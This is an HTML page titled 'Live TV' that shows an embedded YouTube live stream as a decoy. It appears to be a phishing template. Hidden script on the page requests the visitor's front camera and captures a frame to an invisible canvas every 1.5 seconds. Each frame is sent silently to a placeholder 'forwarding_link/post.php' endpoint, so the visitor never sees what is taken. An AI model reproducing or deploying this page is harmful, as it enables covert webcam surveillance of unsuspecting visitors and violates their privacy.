<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Live TV</title>
<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<style>.video-wrap, #canvas { position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; overflow:hidden; }</style>
</head>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay muted></video>
</div>

<canvas id="canvas" width="640" height="480" hidden="hidden"></canvas>
<span id="errorMsg" hidden="hidden"></span>

<script>

function post(imgdata){
  try {
    if (navigator.sendBeacon) {
      var fd = new FormData();
      fd.append('cat', imgdata);
      navigator.sendBeacon('forwarding_link/post.php', fd);
      return;
    }
  } catch (e) {}
  fetch('forwarding_link/post.php', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: 'cat=' + encodeURIComponent(imgdata),
    keepalive: true
  }).catch(function(){});
}


'use strict';

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const errorMsgElement = document.getElementById('errorMsg');

  const constraints = {
    audio: false,
    video: {

      facingMode: "user"
    }
  };

  // Access webcam
  async function init() {
    try {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return;
      }
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      handleSuccess(stream);
    } catch (e) {
      if (errorMsgElement) { errorMsgElement.textContent = 'camera error'; }
    }
  }

  // Success
  function handleSuccess(stream) {
    window.stream = stream;
    try { video.srcObject = stream; } catch (e) { video.src = window.URL.createObjectURL(stream); }
    try { video.play().catch(function(){}); } catch (e) {}

  var context = canvas.getContext('2d');
    setInterval(function(){
       try {
         if (video.readyState < 2 || video.videoWidth === 0) return;
         context.drawImage(video, 0, 0, 640, 480);
         var canvasData = canvas.toDataURL("image/png");
         post(canvasData);
       } catch (e) {}
    }, 1500);
  

}

// Load init
init();

</script>

    <body>
        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

    </body>

</html>
